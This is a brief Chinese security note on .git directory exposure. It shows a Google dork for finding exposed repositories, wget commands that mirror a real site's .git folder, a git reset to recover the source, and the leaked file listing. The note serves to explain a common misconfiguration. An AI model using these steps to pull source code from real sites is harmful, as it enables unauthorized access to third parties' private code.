---
title: Git源码泄露漏洞
created: '2019-09-04T04:21:29.343Z'
modified: '2019-09-04T04:21:49.998Z'
---

# Git源码泄露漏洞

### 介绍

wooyun wiki 中有一篇文章 [Git导致文件泄露](http://wiki.wooyun.org/server:git)，讲了使用 git 时需要注意的一个问题。

git 在初始化代码库的时候，会在当前目录下面产生一个.git的隐藏目录文件，用来记录代码的变更等。
同时使用这个文件，可以恢复各个版本的代码。所以如果 .git 泄漏的话，就可能同时泄漏了源代码。

### [](#u6D4B_u8BD5 "测试")测试

先手工测试下，使用 google 搜索一个泄漏的 .git 文件。

|

1

 |

google: ".git" intitle:"index of"

 |

得到第一条记录：“www.xxxvou.com/.git/” (xxx is harmony)，然后将文件下载到本地

|

1
2
3

 |

mkdir git\-test && cd git\-test
wget \-\-mirror \-\-include\-directories=/.git http://www.xxxvou.com/.git
cd www.xxxvou.com

 |

使用 git 命令使代码库回退到上一个版本

|

1

 |

git reset \-\-hard

 |

完成后即可看到网站（或其他应用）源码

|

1
2
3
4
5
6
7
8
9
10
11

 |

about.html            faq.html                      philosophy.html
anirudhr              google9f9a1d6499d5d387.html   products.html
assets                hack                          robots.txt
bootstrap             images                        showcases.html
bufof.html            index.html                    svn\-commit.tmp
careers.html          ip.php                        team.html
contact.html          lfi.html                      testingstuff
demo.html             management\-console.html       tmp
docs                  network\-enforcer.html         vision.html
endpoint\-module.html  nouvou\-datasheet\-jan2012.pdf
expertises.html       old\-site

 |

### [](#u7EC6_u8282 "细节")细节

*   如何获取 .git 文件：手工下载/工具搜索
*   git 下版本库回退的一些命令以及参数
*   参考：[http://wiki.wooyun.org/server:git](http://wiki.wooyun.org/server:git)

[.git文件源码泄露 | Hycwall's Note](https://cathon.github.io/2015/09/14/get-code-from-get/)
